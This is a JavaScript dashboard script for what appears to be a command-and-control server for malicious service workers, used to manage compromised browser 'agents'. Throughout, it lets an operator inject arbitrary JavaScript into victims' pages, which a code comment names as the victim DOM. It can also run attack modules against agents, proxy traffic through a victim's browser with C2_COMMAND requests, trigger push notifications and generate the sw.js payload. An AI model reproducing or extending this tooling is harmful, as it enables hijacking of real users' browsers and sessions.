var agents, dormantAgents, modules;
var proxyAgent = null;
var agentDisplayed = null;
var refreshRate = 2000;
var fetchAgentAbortcontroller = new AbortController();
var signal = fetchAgentAbortcontroller.signal;
var queuefetchAgentRequests = new Array();

function resetAbortFetchAgentController(){
  fetchAgentAbortcontroller = new AbortController();
  signal = fetchAgentAbortcontroller.signal;
}

function addAgents2sidebar(agent, sidebarId){
  var date = new Date(null);
  var aClass = (agent.active === 'true') ? 'active' : 'dormant' ;  
  var newAgent = `
  <li class="nav-item list-group" id="sidebar-${agent.id}">
    <a class="nav-link ${aClass}" href="#" data-agent-id='${agent.id}' data-action='show-agent'>
      <span data-feather="file-text"></span>
      <div class="card card-${aClass}">
        <div class="card-body smaller-card">
          ${agent.domain}`;
          if(agent.active === 'false')
            newAgent += `<button type="button" class="close" aria-label="Close" data-action='delete-agent'>
                          <span aria-hidden="true">&times;</span>
                         </button>`;
          newAgent += `<br/>
          Source: ${agent.ip}<br/>
          </div>
      </div>
    </a>
  </li>
  `;
  $(sidebarId).append(newAgent);
}

function getModules(){
  fetch(dashUrl() + '/modules').then(function(response){
    response.json().then(function(data){
      modules = data.modules;
      var autoLoadedModules = data.autoLoadedModules;
      for(i = 0; i < modules.length; i++){
        var autoLoaded = autoLoadedModules.indexOf(modules[i]) >= 0;
        var modulesHTML = `<hr/><img src="/static/images/tick.png"`;
        if(!autoLoaded)
          modulesHTML += ` class="hidden"`;
        modulesHTML += `/> <a href='#' data-action='auto-load-module' data-loaded='${autoLoaded}' data-module-name='${modules[i]}'>${modules[i]}</a>`;
        $('div#auto-load-modules').append(modulesHTML);
      }
    });
  });
}

function updateDisplayStatus(){
  if(proxyAgent !== null && !(proxyAgent in agents)){ // if proxy agent displayed changes from dormant, remove proxy and refresh agent
    showAgent(proxyAgent);
    $("a#clear-proxy").click();
    proxyAgent = null;
  }else{ // if current agent displayed changes from active to dormant or viceversa, refresh it
    checkAgentShownStatus();
  }
}

function checkAgentShownStatus(){
  if(agentDisplayed !== null){
    if(agentDisplayed.active === 'true' && !(agentDisplayed.id in agents)){
      // if was active and now not
      showAgent(agentDisplayed.id);
    }
    if(agentDisplayed.active === 'false' && !(agentDisplayed.id in dormantAgents)){
      // if was dormant and now awake
      showAgent(agentDisplayed.id);
    }
  }
}

function updateSidebar(){
  fetch(dashUrl() + '/agents').then(function(response){
    response.json().then(function(data){
	    agents = data.active;
      dormantAgents = data.dormant;
      updateDisplayStatus();
      $('#agents-sidebar').html('');
      for(var agentID in agents)
  	    addAgents2sidebar(agents[agentID], '#agents-sidebar');
      $('#dormant-agents-sidebar').html('');
      for(var agentID in dormantAgents)
  	    addAgents2sidebar(dormantAgents[agentID], '#dormant-agents-sidebar');
    });
  });
}

// SHOW AGENT
function showAgent(agentID){
  if(queuefetchAgentRequests.length !== 0){
    fetchAgentAbortcontroller.abort();
    resetAbortFetchAgentController();
  }
  var $mainPanel = $('#agents-main');
  queuefetchAgentRequests.push(1);
  fetch(dashUrl() + '/agent/' + agentID, { signal }).
    then(function(response){
      queuefetchAgentRequests.pop();
      response.json().then(function(agent){
        agentDisplayed = agent;
      	agentHtml = `
      	<br/>
      	<div class="jumbotron">
      	  <h3 class="display-4">${agent.id}</h3>
      	  <br/>
        	<b>IP:</b>${agent.ip}</b>
          <br/>
        	<b>Status:</b>`;
        if(agent.active == 'true')
          agentHtml += `<p class='text-success'>Online</p>`;
        else
          agentHtml += `<p>Offline</p>`;
        agentHtml += `<b>DOM Status:</b>`;
        if(agent.domActive == 'true')
          agentHtml += `<p class='text-success'>Online</p>`;
        else
          agentHtml += `<p>Offline</p>`;
        agentHtml += `<br/>
        	<b>First Seen:</b>
          ${agent.first_seen} 
          <br/>
        	<b>Domain Scope:</b>
          <a href="https://${agent.domain}:${agent.port}" target="_blank">${agent.domain}:${agent.port}</a>
          <br/>
          <br/>
          <input type="text" name="dom_command" id="dom-command-js"/>
          <button type="button" id="dom-command" class="btn btn-secondary" data-agent-id="${agent.id}">Send JS to DOM</button>
          `;
        if(agent.dom_commands){
            agentHtml += `<hr/>`;
            for(var dom_command in agent.dom_commands){
              agentHtml += `<p><i>${dom_command}</i>`;
              if(dom_command['result'] !== undefined){
                agentHtml += `<br/>${dom_command['result']}</p>`;
              }
              agentHtml += `<hr/>`;
            }
        }else{
          agentHtml += `<hr/>`;
        }
        if(agent.active === 'true'){
        	agentHtml += `<button type="button" id="proxy-through-agent" class="btn btn-secondary" data-agent-id="${agent.id}">Proxy through Agent</button> `;
        }
        for(i = 0; i < modules.length; i++){
          if(!agent.modules || !(modules[i] in agent.modules))
          agentHtml += `<button type="button" data-module='true' data-module-name="${modules[i]}" class="btn btn-secondary" data-agent-id="${agent.id}">Execute ${modules[i]} Module</button> `;
        }
        if(agent.push === 'true')
          agentHtml += `<button type="button" class="btn btn-secondary" data-agent-id="${agent.id}" id="trigger-push">Trigger Push Notification</button>`;
        if(agent.modules){
          agentHtml += `<hr/>`;
          agentHtml += `<h3>Module Results:</h3>`;
          for(var moduleName in agent.modules){
            agentHtml += `<h4>${moduleName}<button type="button" class="close" aria-label="Close" 
                          data-module-name='${moduleName}' data-agent-id='${agent.id}' data-action='delete-module'>
                          <span aria-hidden="true">&times;</span>
                         </button></h4>`;
            agentHtml += `<p>${agent.modules[moduleName]}</p>`;
            agentHtml += `<hr/>`;
          }
        }
        agentHtml += `
        </div>`;        
        $mainPanel.html(agentHtml);
    });
  });
}

// SEND JS TO VICTIM DOM IF EVER GETS TRIGGERED
$(document).on("click", "button#dom-command", function(){
  var js = $('input#dom-command-js').val();
  if(js == '')
    return;
  var $btn = $(this);
  fetch(dashUrl() + `/dom/${$btn.data('agent-id')}`, {
    method: 'POST', 
    body: JSON.stringify({'js': js}),
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    }
  }).then(function(res){
    if(!res.ok){
      $btn.attr("class", "btn btn-danger");
    }
    else{
      $btn.attr("class", "btn btn-success");
      setTimeout(function(){showAgent($btn.data('agent-id'))}, 1700);
    }
  });
});

// LOAD MODULE AGAINST AGENT
$(document).on("click", "[data-module='true']", function(){
  var $btn = $(this);
  fetch(dashUrl() + `/module/${$btn.data('module-name')}/${$btn.data('agent-id')}`, {method: 'POST'}).then(function(res){
    if(!res.ok){
      $btn.attr("class", "btn btn-danger");
    }
    else{
      $btn.attr("class", "btn btn-success");
      setTimeout(function(){showAgent($btn.data('agent-id'))}, 1700);
    }
  });
});

// DELETE MODULE AGAINST AGENT
$(document).on("click", "[data-action='delete-module']", function(){
  var $btn = $(this);
  $btn.hide();
  fetch(dashUrl() + `/module/${$btn.data('module-name')}/${$btn.data('agent-id')}`, {method: 'DELETE'}).then(function(){
    showAgent($btn.data('agent-id'));
  });
});

// AUTO LOAD MODULE ON NEW AGENT
$(document).on("click", "a[data-action='auto-load-module']", function(){
  var $btn = $(this);
  $btn.hide();
  var wasLoaded = $btn.data('loaded') === true;
  var method = wasLoaded ? 'DELETE' : 'POST';
  fetch(dashUrl() + `/automodule/${$btn.data('module-name')}`, {method: method}).then(function(){
    if(wasLoaded){
      $btn.prev().hide();
      $btn.data('loaded', false);
    }else{
      $btn.prev().show();
      $btn.data('loaded', true);
    }
    $btn.show();
  });
});

// LOAD AGENT DETAILS
$(document).on("click", "a[data-action='show-agent']", function(){
	showAgent($(this).data('agent-id'));
});

// DELETE AGENT
$(document).on("click", "button[data-action='delete-agent']", function(event){
  event.stopPropagation();
  $btn = $(this);
  var agentID = $btn.closest('a').data('agent-id');
  $btn.hide();
  fetch(dashUrl() + `/agent/${agentID}`, {method: 'DELETE'}).then(function(res){
    if(res.ok){
      $(`li#sidebar-${agent.id}`).remove();
    }
  });
});


// TRIGGER PUSH
$(document).on("click", "button#trigger-push", function(){
  var $btn = $(this);
  fetch(dashUrl() + `/push/${$(this).data('agent-id')}`, {method: 'POST'}).then(function(res){
    if(!res.ok){
      $btn.attr("class", "btn btn-danger");
    }
    else{
      $btn.attr("class", "btn btn-success");
      setTimeout(function(){$btn.attr("class", "btn btn-secondary")}, 2000);
    }
  });
});

// PROXY THROUGH AGENT
$(document).on("click", "button#proxy-through-agent", function(){
  var $btn = $(this);
  var agentID = $btn.data('agent-id');
	fetch(proxyUrl() + '/C2_COMMAND?action=setproxy&domain=' + agents[agentID]['domain'] + '&port=' + agents[agentID]['port'] + '&agentID=' + agentID,
    {method: 'GET', mode: "no-cors"}).then(function(){
      proxyAgent = agentID;
      $btn.attr("class", "btn btn-success");
      $("#proxy-status-bar").html(`Status: Proxying through <p class='text-success'>${agentID}</p>`);
  });
});

// CLEAR PROXY
$(document).on("click", "a#clear-proxy", function(){
  if(proxyAgent !== null){
  	fetch(proxyUrl() + '/C2_COMMAND?action=clearproxy', {method: 'GET', mode: "no-cors"}).then(function(){
      $("#proxy-status-bar").html('Status: Not Proxying');
      $("button#proxy-through-agent").attr("class", "btn btn-secondary");
    });
  }
});

$(document).on("click", "a#generate-sw", function(){
  fetch(c2Url() + `/modules/sw.js`).then(function(res){
    if(res.ok){
      res.text().then(function(res){
        $('textarea#sw-result').text(res).show();
      });
    }
  });
});

$(document).on("click", "textarea#sw-result", function(){
  this.select();
  document.execCommand("copy");
});

function proxyUrl(){
  return window.location.protocol +"//" + window.location.hostname;
}

function c2Url(){
  return window.location.protocol + '//' + window.location.hostname + ':' + window.location.port;
}

function dashUrl(){
  return c2Url() + '/dashboard';
}

$(document).ready(function(){
  getModules();
  setInterval(updateSidebar, refreshRate);
  navigator.serviceWorker.register('sw.js').then(function(s){
    Notification.requestPermission().then(function(){
      s.active.postMessage({'p':'1'})
    });
  });
});

